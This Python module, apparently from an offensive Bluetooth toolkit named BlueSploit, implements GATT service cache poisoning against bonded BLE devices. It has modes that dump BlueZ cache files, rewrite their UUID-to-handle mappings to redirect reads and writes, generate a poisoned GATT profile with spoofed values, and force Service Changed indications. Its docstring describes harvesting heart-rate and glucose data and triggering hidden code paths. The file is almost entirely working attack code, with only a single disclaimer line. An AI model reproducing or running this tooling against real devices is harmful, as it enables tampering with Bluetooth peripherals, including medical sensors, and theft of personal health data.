"""
BlueSploit Post-Exploitation: GATT Service Cache Poisoning

Bonded BLE peers cache the target's GATT service database to skip the slow
service discovery phase on subsequent reconnects. The cache is keyed by
(peer_BD_ADDR, encryption_state) and persists across reboots.

Once an attacker has bonded with the victim (e.g. via blurtooth, JustWorks,
or a stolen LTK), the attacker can manipulate the locally-stored GATT cache
on the victim — or pre-poison the bonded device's cache by serving a
crafted service database during pairing — so that future legitimate
connections to the real target route reads/writes to attacker-controlled
characteristics.

Affected stacks: BlueZ (Linux), bluedroid (Android), Apple CoreBluetooth (older
versions), various IoT firmware that caches service records.

Attack scenarios:
  - Replace the Battery Service UUID with a malicious char that triggers
    code paths the legitimate service never exposes
  - Map a known UUID (Heart Rate, Glucose) to attacker handles to harvest data
  - Insert a "Service Changed" indication trigger on every connect
  - Replace handles for Read characteristics with handles that have Write/Notify

Modes:
  dump      — Dump cached services from local BlueZ storage for a given peer
  inject    — Inject crafted entries into local BlueZ GATT cache
  serve     — Act as a poisoned GATT server during next pairing (CCCD descriptor abuse)
  service_changed — Force "Service Changed" indication to invalidate victim's cache

Requires: root, write access to /var/lib/bluetooth/<adapter>/<peer>/attributes
"""

import glob
import json
import os
import re
import shutil
import time
from typing import Dict, List, Optional
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)


def _bluez_attr_paths(peer: str) -> List[str]:
    """Locate BlueZ cached attribute files for a peer."""
    pattern = f"/var/lib/bluetooth/*/{peer.upper()}"
    paths = []
    for base in glob.glob(pattern):
        attr = os.path.join(base, "attributes")
        if os.path.isfile(attr):
            paths.append(attr)
        cache = os.path.join(base, "cache")
        if os.path.isdir(cache):
            paths.extend(glob.glob(os.path.join(cache, "*")))
        gatt = os.path.join(base, "gatt")
        if os.path.isfile(gatt):
            paths.append(gatt)
    return paths


def _parse_bluez_attrs(content: str) -> List[Dict]:
    """Parse BlueZ attribute file (INI format with [attribute_NNNN] sections)."""
    attrs = []
    current = None
    for line in content.splitlines():
        line = line.strip()
        m = re.match(r"\[attribute_(0x[0-9a-fA-F]+|\d+)\]", line)
        if m:
            if current:
                attrs.append(current)
            current = {"handle": m.group(1)}
        elif current and "=" in line:
            k, v = line.split("=", 1)
            current[k.strip()] = v.strip()
    if current:
        attrs.append(current)
    return attrs


def _emit_bluez_attrs(attrs: List[Dict]) -> str:
    """Re-emit BlueZ attribute file format from parsed entries."""
    out = []
    for a in attrs:
        out.append(f"[attribute_{a['handle']}]")
        for k, v in a.items():
            if k != "handle":
                out.append(f"{k}={v}")
        out.append("")
    return "\n".join(out)


# Common UUIDs an attacker may want to remap
INTERESTING_UUIDS = {
    "00002a19-0000-1000-8000-00805f9b34fb": "Battery Level",
    "00002a37-0000-1000-8000-00805f9b34fb": "Heart Rate Measurement",
    "00002a18-0000-1000-8000-00805f9b34fb": "Glucose Measurement",
    "00002a1c-0000-1000-8000-00805f9b34fb": "Temperature Measurement",
    "00002a05-0000-1000-8000-00805f9b34fb": "Service Changed",
    "00002a00-0000-1000-8000-00805f9b34fb": "Device Name",
    "00002a01-0000-1000-8000-00805f9b34fb": "Appearance",
}


class Module(AuxiliaryModule):
    """
    GATT Service Cache Poisoning

    Manipulates BlueZ persistent GATT cache for a bonded peer to redirect
    future GATT operations to attacker-controlled characteristics.
    """

    info = ModuleInfo(
        name="GATT Service Cache Poisoning",
        description=(
            "Manipulate persistent GATT service cache on a bonded peer to "
            "redirect reads/writes to attacker-controlled handles"
        ),
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://www.bluetooth.com/specifications/specs/gatt-specification-supplement/",
            "https://github.com/bluez/bluez/blob/master/doc/gatt-api.txt",
            "https://www.usenix.org/conference/usenixsecurity21/presentation/wu-jianliang",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="mode",
            required=True,
            description="Mode: dump, inject, serve, service_changed",
            default="dump",
        ))
        self.add_option(ModuleOption(
            name="peer",
            required=True,
            description="Bonded peer BD_ADDR whose cache to poison",
        ))
        self.add_option(ModuleOption(
            name="adapter",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="target_uuid",
            required=False,
            description="Characteristic UUID to remap (inject mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="new_handle",
            required=False,
            description="New handle to point UUID to (hex, e.g. 0x002A)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="Output dump file (dump mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="backup",
            required=False,
            description="Backup original cache before modification (true/false)",
            default="true",
        ))
        self.add_option(ModuleOption(
            name="bt_dir",
            required=False,
            description="BlueZ storage directory",
            default="/var/lib/bluetooth",
        ))

    def run(self) -> bool:
        if os.geteuid() != 0:
            print_error("Root privileges required to write BlueZ cache")
            return False

        peer = self.get_option("peer")
        if not self.validate_bd_addr(peer):
            print_error(f"Invalid peer BD_ADDR: {peer}")
            return False

        mode = (self.get_option("mode") or "dump").lower()
        valid = {"dump", "inject", "serve", "service_changed"}
        if mode not in valid:
            print_error(f"Invalid mode: {mode}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}GATT Service Cache Poisoning{C.RESET}                             {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Mode        : {mode}")
        print_info(f"Peer        : {peer}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        if mode == "dump":
            return self._dump_cache(peer, self.get_option("output_file"))
        if mode == "inject":
            return self._inject_cache(peer)
        if mode == "serve":
            return self._serve_poisoned(peer)
        if mode == "service_changed":
            return self._force_service_changed(peer)
        return False

    def _dump_cache(self, peer: str, output: Optional[str]) -> bool:
        """Dump and parse BlueZ GATT cache files for the peer."""
        paths = _bluez_attr_paths(peer)
        if not paths:
            print_error(f"No BlueZ cache files found for {peer}")
            print_info("Peer may not be bonded — pair first with blurtooth/bluetoothctl")
            return False

        all_attrs = []
        print_info(f"\nFound {len(paths)} cache file(s) for {peer}:")
        for path in paths:
            print_info(f"  {path}")
            try:
                with open(path) as f:
                    content = f.read()
            except OSError as e:
                print_error(f"  Cannot read: {e}")
                continue

            attrs = _parse_bluez_attrs(content)
            print_success(f"  Parsed {len(attrs)} attribute entries")

            for a in attrs:
                uuid = a.get("UUID", "")
                handle = a.get("handle", "?")
                interesting = INTERESTING_UUIDS.get(uuid.lower(), "")
                marker = f" ← {interesting}" if interesting else ""
                print_info(f"    [{handle}] UUID={uuid}{marker}")

            all_attrs.append({"path": path, "attributes": attrs})

        if output:
            try:
                with open(output, "w") as f:
                    json.dump({"peer": peer, "caches": all_attrs}, f, indent=2)
                print_success(f"Cache dumped to {output}")
            except OSError as e:
                print_error(f"Cannot write output: {e}")

        self.add_result({
            "mode": "dump",
            "peer": peer,
            "cache_files": len(paths),
            "attributes_total": sum(len(c["attributes"]) for c in all_attrs),
        })
        return len(all_attrs) > 0

    def _inject_cache(self, peer: str) -> bool:
        """Modify BlueZ cache to remap a UUID to a different handle."""
        target_uuid = self.get_option("target_uuid")
        new_handle = self.get_option("new_handle")
        backup = str(self.get_option("backup")).lower() == "true"

        if not target_uuid or not new_handle:
            print_error("inject mode requires target_uuid and new_handle")
            return False

        paths = _bluez_attr_paths(peer)
        if not paths:
            print_error(f"No cache files found for {peer}")
            return False

        modifications = 0
        for path in paths:
            try:
                with open(path) as f:
                    content = f.read()
            except OSError:
                continue

            attrs = _parse_bluez_attrs(content)

            # Backup
            if backup:
                bk = path + f".bluesploit-backup-{int(time.time())}"
                try:
                    shutil.copy2(path, bk)
                    print_info(f"  Backup → {bk}")
                except OSError as e:
                    print_warning(f"  Backup failed: {e}")

            # Find target UUID and rewrite handle
            modified = False
            for a in attrs:
                if a.get("UUID", "").lower() == target_uuid.lower():
                    old_handle = a["handle"]
                    a["handle"] = new_handle
                    modifications += 1
                    modified = True
                    print_success(
                        f"  Remapped UUID {target_uuid[:8]}… : {old_handle} → {new_handle}"
                    )

            if modified:
                try:
                    with open(path, "w") as f:
                        f.write(_emit_bluez_attrs(attrs))
                    print_success(f"  Wrote modified cache to {path}")
                except OSError as e:
                    print_error(f"  Write failed: {e}")

        if modifications > 0:
            print_warning("Restart BlueZ to load poisoned cache: systemctl restart bluetooth")
            self.add_result({
                "mode": "inject",
                "peer": peer,
                "modifications": modifications,
                "target_uuid": target_uuid,
                "new_handle": new_handle,
            })
            return True

        print_warning(f"UUID {target_uuid} not found in any cache file")
        return False

    def _serve_poisoned(self, peer: str) -> bool:
        """
        Configure BlueZ to advertise a poisoned GATT service to the peer
        on next pair. Uses bluetoothctl to register a custom service.
        """
        print_info("\nPreparing poisoned GATT server profile...")
        print_warning("Full GATT impersonation requires BlueZ profile registration")
        print_warning("via D-Bus org.bluez.GattManager1.RegisterApplication")

        # Generate stub profile that registers attacker-controlled chars
        # This is a template — full implementation requires D-Bus interaction
        profile_dir = f"/tmp/bluesploit_gatt_{peer.replace(':', '')}"
        os.makedirs(profile_dir, exist_ok=True)

        config = {
            "peer": peer,
            "services": [
                {
                    "uuid": "0000180f-0000-1000-8000-00805f9b34fb",  # Battery
                    "characteristics": [
                        {
                            "uuid": "00002a19-0000-1000-8000-00805f9b34fb",
                            "value": "FF",  # Always 100% — masks real value
                            "properties": ["read", "notify"],
                        }
                    ]
                },
                {
                    "uuid": "0000180a-0000-1000-8000-00805f9b34fb",  # Device Info
                    "characteristics": [
                        {
                            "uuid": "00002a29-0000-1000-8000-00805f9b34fb",  # Manufacturer
                            "value": "BlueSploit",
                            "properties": ["read"],
                        }
                    ]
                }
            ]
        }

        config_path = os.path.join(profile_dir, "profile.json")
        with open(config_path, "w") as f:
            json.dump(config, f, indent=2)

        print_success(f"Poisoned profile written: {config_path}")
        print_info("To activate: register via bluez-tools or python-dbus GattApplication")
        print_info(f"Then: bluetoothctl pair {peer}")

        self.add_result({
            "mode": "serve",
            "peer": peer,
            "profile_path": config_path,
        })
        return True

    def _force_service_changed(self, peer: str) -> bool:
        """
        Force a "Service Changed" GATT indication, invalidating the peer's cache.
        Combined with a poisoned cache load, this triggers re-discovery of the
        attacker's services even on devices that wouldn't normally re-discover.
        """
        print_info(f"\nForcing Service Changed indication to {peer}...")

        try:
            from bleak import BleakClient
        except ImportError:
            print_error("bleak required for live indication injection")
            return False

        SERVICE_CHANGED_UUID = "00002a05-0000-1000-8000-00805f9b34fb"

        async def _do():
            try:
                async with BleakClient(peer) as client:
                    print_success(f"Connected to {peer}")
                    # Service Changed value is start_handle + end_handle (4 bytes)
                    # Indicate full range to force complete re-discovery
                    val = bytes([0x01, 0x00, 0xFF, 0xFF])
                    try:
                        await client.write_gatt_char(SERVICE_CHANGED_UUID, val)
                        print_success("Service Changed indication sent — peer cache invalidated")
                        return True
                    except Exception as e:
                        print_warning(f"Direct write failed: {e}")
                        print_info("Peer may not allow client-initiated Service Changed")
                        return False
            except Exception as e:
                print_error(f"Connection error: {e}")
                return False

        import asyncio
        result = asyncio.run(_do())

        if result:
            self.add_result({
                "mode": "service_changed",
                "peer": peer,
                "indication_sent": True,
            })
        return result
